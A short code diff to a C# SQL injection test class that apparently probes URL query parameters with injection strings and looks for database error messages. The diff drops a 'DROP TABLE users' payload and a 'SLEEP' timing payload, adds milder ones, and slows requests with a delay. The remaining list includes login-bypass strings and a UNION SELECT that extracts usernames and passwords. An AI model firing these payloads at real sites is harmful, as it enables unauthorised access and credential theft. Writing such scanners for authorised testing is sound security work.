@@ -5,10 +5,10 @@ public class SqlInjectionTest
     private static readonly string[] Payloads =
     {
         "' OR '1'='1",
-        "'; DROP TABLE users; --",
         "' UNION SELECT null, username, password FROM users --",
-        "1' AND SLEEP(3) --",
-        "admin'--"
+        "admin'--",
+        "' OR '1'='1' --",
+        "'"
     };
 
     private static readonly string[] ErrorSignatures =
@@ -62,6 +62,7 @@ public class SqlInjectionTest
                     var testUrl = $"{uri.GetLeftPart(UriPartial.Path)}?{qs}";
                     var res     = await client.GetAsync(testUrl);
                     var body    = (await res.Content.ReadAsStringAsync()).ToLower();
+                    await Task.Delay(100);
 
                     foreach (var sig in ErrorSignatures)
                     {
